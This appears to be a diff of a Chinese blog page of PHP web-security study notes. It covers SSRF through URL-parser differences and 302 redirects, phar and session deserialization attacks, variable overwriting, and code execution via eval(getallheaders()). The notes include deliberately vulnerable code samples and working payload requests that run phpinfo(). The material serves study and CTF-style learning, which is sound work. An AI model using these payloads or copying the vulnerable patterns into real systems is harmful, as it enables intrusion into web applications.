-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">"b.com"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"u"</span></span><br><span class="line">  [<span class="string">"pass"</span>]=&gt;</span><br><span class="line">  string(<span class="number">10</span>) <span class="string">"p@a.com:80"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">10</span>) <span class="string">"/index.php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;b.com&quot;</span></span><br><span class="line">  [<span class="string">&quot;user&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;u&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;p@a.com:80&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;/index.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>  前面的@a.com会被忽略掉   </p>
 <p>libcurl解析结果</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">schema: http</span><br><span class="line">host: a.com</span><br><span class="line">user: u</span><br><span class="line">pass: p</span><br><span class="line">port: <span class="number">80</span></span><br></pre></td></tr></table></figure>
-
 <p>  后面的@b.com会被忽略掉   </p>
-<h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/$data"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="variable">$scheme</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">header(<span class="string">&quot;Location: <span class="subst">$scheme</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$data</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paylaod </span><br><span class="line">GET /test.php?url=http://192.168.110.145/302.php%3fs%3dhttp%26ip%3d192.168.110.1%26port%3d80%26data%3dneiwang.php HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paylaod </span><br><span class="line">GET &#x2F;test.php?url&#x3D;http:&#x2F;&#x2F;192.168.110.145&#x2F;302.php%3fs%3dhttp%26ip%3d192.168.110.1%26port%3d80%26data%3dneiwang.php HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+
 
 <p>test.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>); <span class="comment">//支持302跳转</span></span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ch</span> = curl_init(); </span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>); <span class="comment">//支持302跳转</span></span><br><span class="line">curl_exec(<span class="variable">$ch</span>); </span><br><span class="line">curl_close(<span class="variable">$ch</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 
 <p>neiwang.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>结果</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">13</span>) <span class="string">"192.168.110.1"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;192.168.110.1&quot;</span></span><br></pre></td></tr></table></figure>
+
 
 <p>ssrf还有几点问题</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP的curl默认不跟随302跳转</span><br><span class="line">curl7.43上gopher协议存在%00截断的BUG，v7.49可用</span><br><span class="line">file_get_contents()的SSRF，gopher协议不能使用URLencode</span><br><span class="line">file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败</span><br></pre></td></tr></table></figure>
 
+
+
+
 <h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>unserialize() 反序列化</p>
 <p>serialize()  序列化</p>
-<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__construct  当对象初始化时触发</span><br><span class="line">__destory   当对象销毁的时触发</span><br><span class="line"></span><br><span class="line">__tostring 当对象被当作字符串的时触发  </span><br><span class="line">&quot;hello&quot;.$class.&quot;world&quot;  还有file_exist 这两种情况也会触发</span><br><span class="line"></span><br><span class="line">__call    当调用无法调用的函数时触发</span><br><span class="line">__get     当访问无法访问的属性时触发  </span><br><span class="line">无法调用还有无法访问包括 不存在的 还有私有变量</span><br><span class="line"></span><br><span class="line">__sleep 当一个对象被序列化时触发</span><br><span class="line">__wakeup 当一个对象被反序列化时触发</span><br></pre></td></tr></table></figure>
-
+<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__construct  当对象初始化时触发</span><br><span class="line">__destory   当对象销毁的时触发</span><br><span class="line"></span><br><span class="line">__tostring 当对象被当作字符串的时触发  </span><br><span class="line">&quot;hello&quot;.$class.&quot;world&quot;  还有file_exist 这两种情况也会触发</span><br><span class="line"></span><br><span class="line">__call    当调用无法调用的函数时触发</span><br><span class="line">__get     当访问无法访问的属性时触发  </span><br><span class="line">无法调用还有无法访问包括 不存在的 还有私有变量</span><br><span class="line"></span><br><span class="line">__sleep 当一个对象被序列化时触发</span><br><span class="line">__wakeup 当一个对象被反序列化时触发</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>主要是pop链的构造 还有绕过</p>
 <p>__wakeup 当成员属性的个数大于实际成员数目时，可绕过 并且在成员属性的个数前面加上+ 也可以</p>
 <p>私有变量 反序列化后 会生成两个%00 要注意</p>
 <p>反序列化还有一个特性 当反序列化足够多的字符时，后面的数据就会被扔掉 比如</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;user&quot;;s:51:&quot;O:4:&quot;user&quot;:1:&#123;s:4:&quot;test&quot;;s:17:&quot;&lt;?php phpinfo()?&gt;&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
 <p>最后的三个字符”;}不影响反序列化，当反序列化足够多的字符时，剩下的数据，会被抛弃 前面有s:17的字符个数限制，所以当反序列化17个字符的时候，后面的就被仍掉了</p>
 <h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>phar是php中的一个打包文件，类似javaz中的war</p>
 <p>php提供一个phar类允许我们处理phar文件相关操作。注意要将php.ini中的phar.readonly选项设置为Off或者在代码中加上 ini_set(“phar.readonly”,0); 这一句</p>
 <p>phar文件的meta-data部分在存储时会被序列化，解析时，会反序列化处理</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a=<span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">'phar.phar'</span>); </span><br><span class="line">$phar=<span class="keyword">new</span> phar(<span class="string">"phar.phar"</span>);         <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();             <span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//phar文件标志，可以加上其他文件头，以绕过检测 "GIF89a"."<span class="meta">&lt;?php</span> __HALT_COMPILER();"  </span></span><br><span class="line">$o=<span class="keyword">new</span> User();</span><br><span class="line">$phar-&gt;setMetadata($o);             <span class="comment">//添加meta-data数据</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&#x27;phar.phar&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> phar(<span class="string">&quot;phar.phar&quot;</span>);         <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();             <span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//phar文件标志，可以加上其他文件头，以绕过检测 &quot;GIF89a&quot;.&quot;<span class="meta">&lt;?php</span> __HALT_COMPILER();&quot;  </span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);             <span class="comment">//添加meta-data数据</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_get_contents($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a=<span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">?url=phar:<span class="comment">//phar.phar/test.txt</span></span><br></pre></td></tr></table></figure>
 
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">?url=phar:<span class="comment">//phar.phar/test.txt</span></span><br></pre></td></tr></table></figure>
 <p>能够执行phpinfo()</p>
 <h3 id="session中的反序列化"><a href="#session中的反序列化" class="headerlink" title="session中的反序列化"></a>session中的反序列化</h3><p>php有三种反序列化方式</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_binary:键名的长度对应的ASCII字符+键名+键值经过serialize()函数序列化处理的值</span><br><span class="line"></span><br><span class="line">php:键名+竖线+键值经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;5.5.4):经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure>
 
+
 <p>如果数据以php_serialize的方式序列化，以php的方式反序列化，就会出现问题</p>
 <p>通过php_serialize传入值，在加上一个竖线| ，伪造这样一串数据，</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:5:&quot;|code&quot;;</span><br></pre></td></tr></table></figure>
-
 <p>这串数据当被php这种序列化方式解析的时候，键就变成了 s:5:”|  值就变成了 code 也就是值不再被当作字符串，而是单独的一部分被反序列化</p>
 <h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><h3 id><a href="#" class="headerlink" title="$"></a>$</h3><h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h3><h3 id="全局变量注册"><a href="#全局变量注册" class="headerlink" title="全局变量注册"></a>全局变量注册</h3><p>auth变量没有设置，但是访问参数内有auth变量，auth会被自动的设置  前提   register_globals=ON   </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"private!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$auth = <span class="string">"0"</span>;</span><br><span class="line">import_request_variables(<span class="string">"G"</span>);</span><br><span class="line"><span class="keyword">if</span> ($auth == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"private!"</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"public!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<h3 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span> = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">import_request_variables(<span class="string">&quot;G&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$auth</span> == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>访问auth=1 就会自动设置auth变量</p>
 <h2 id="无参数函数"><a href="#无参数函数" class="headerlink" title="无参数函数"></a>无参数函数</h2><h3 id="超全局变量-ENV"><a href="#超全局变量-ENV" class="headerlink" title="超全局变量$_ENV"></a>超全局变量$_ENV</h3><p>$_ENV 通过getenv函数调用</p>
 <p>getenv获取当前的环境变量<br>array_rand 从数组中随机的获取元素<br>array_flip() 交换数组中的键和值 键变为值 值变为键</p>
 <h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders"></a>getallheaders</h3><p>后台代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 <p>请求头</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /fuzz.php?code=eval(getallheaders()[&apos;P1k&apos;]); HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">p1k: phpinfo();</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;fuzz.php?code&#x3D;eval(getallheaders()[&#39;P1k&#39;]); HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">p1k: phpinfo();</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
 
 <p>这种情况有[]参数 不能绕过正则 要是有正则 可以通过current next end pos获取元素<br>注意getallheaders 只适用于apache 因为他是apache的函数</p>
-<h2 id="配置函数"><a href="#配置函数" class="headerlink" title="配置函数"></a>配置函数</h2><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;需要设置的引擎&apos;);</span><br><span class="line">session_start(&apos;serialize_handler=需要设置的引擎&apos;)</span><br></pre></td></tr></table></figure>
